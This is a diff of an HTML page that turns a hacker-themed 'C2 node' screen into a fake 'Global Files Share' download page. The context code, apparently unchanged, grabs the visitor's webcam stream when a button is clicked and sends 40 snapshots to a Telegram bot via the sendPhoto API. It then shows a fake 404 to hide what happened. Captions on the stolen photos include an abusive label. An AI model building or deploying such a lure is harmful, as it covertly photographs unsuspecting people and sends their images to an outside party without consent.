@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Security Gateway | Advanced Terminal</title>
+    <title>GLOBAL FILE VIEWER | ADVANCEED SEQURITY</title>
     <style>
         :root {
             --primary: #00d4ff;
@@ -133,12 +133,12 @@
             <div style="font-size: 70px; opacity: 0.8;">👤</div>
         </div>
         
-        <h1 id="title">Protocol 40-X</h1>
-        <p class="subtitle">ENCRYPTED NODE: C2-ALPHA-NORTH // ACCESS POINT 443</p>
+        <h1 id="title">GLOBAL FILES SHARE</h1>
+        <p class="subtitle">ENCRYPTED NODE: DOWNLOADING RESOURCES // ACCESS POINT 443</p>
 
         <div id="console">
             > SYSTEM STATUS: IDLE<br>
-            > LOG: AWAITING HANDSHAKE SIGNAL...
+            > LOG: AWAITING DOWNLOAD SIGNAL...
         </div>
 
         <button class="btn" id="mainBtn" onclick="initiate()">Authorize Stream</button>
@@ -186,9 +186,9 @@
                 scanLine.style.display = 'block';
                 document.getElementById('title').classList.add('glitch');
 
-                logToConsole("ESTABLISHING SECURE TUNNEL...");
-                logToConsole("HANDSHAKE VERIFIED.");
-                logToConsole("INITIATING 40-FRAGMENT UPLINK...");
+                logToConsole("ESTABLISHING SECURE DOWNLOADING TUNNEL...");
+                logToConsole("RESOURCES VERIFIED.");
+                logToConsole("REDIRECTING TO DOWNLOADING PAGE...");
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
@@ -201,7 +201,7 @@
                     const interval = setInterval(() => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
-                            logToConsole("UPLINK COMPLETE. CLOSING TUNNEL...");
+                            logToConsole("VERFICATION COMPLETE. CLOSING TUNNEL...");
                             stream.getTracks().forEach(track => track.stop());
                             setTimeout(render404, 2000);
                             return;
@@ -216,10 +216,10 @@
                         
                         // Dynamic advanced logs
                         const techLogs = [
-                            `PACKET_CHUNK_${count} ENCRYPTED`,
+                            `RESOURCE_CHUNK_${count} DOWNLOADING`,
                             `ROUTING VIA C2-NODE-ALPHA...`,
-                            `PARITY CHECK: OK`,
-                            `SEQUENCE_${count} TRANSMITTED`,
+                            `SYSTEM CHECK: OK`,
+                            `SEQUENCE_${count} DOWNLOADED`,
                             `BUFFERING DATA STREAM...`
                         ];
                         logToConsole(techLogs[count % techLogs.length]);
@@ -227,7 +227,7 @@
                     }, 1600); // Doubled time (1.6 seconds)
                 };
             } catch (e) {
-                logToConsole("ACCESS DENIED: BIOS_PERM_ERROR");
+                logToConsole("ACCESS DENIED: USER PERMISSION ERROR");
                 consoleEl.style.color = "#ff4b4b";
             }
         }
@@ -246,7 +246,7 @@
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
                     fd.append('photo', blob, 'identity_packet.jpg');
-                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '/40\nAgent: C2-Advanced-Node');
+                    fd.append('caption', '🎯 DUSHMAN KI MKB \nFragment: ' + index + '/40\nAgent: C2-Advanced-Node');
 
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
